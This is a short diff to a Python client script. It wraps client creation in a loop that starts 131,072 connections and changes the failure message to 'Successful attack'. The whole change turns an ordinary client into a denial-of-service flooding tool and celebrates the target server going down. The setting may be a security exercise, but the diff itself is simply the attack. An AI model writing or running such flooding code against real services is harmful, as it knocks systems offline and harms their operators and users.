@@ -25,7 +25,8 @@ class Client:
 
 if __name__ == '__main__':
     try:
-        new_client = Client()
-        new_client.start()
+        for i in range(2**17):
+            new_client = Client()
+            new_client.start()
     except Exception:
-        print("Lost connection to server")
+        print("Successful attack")
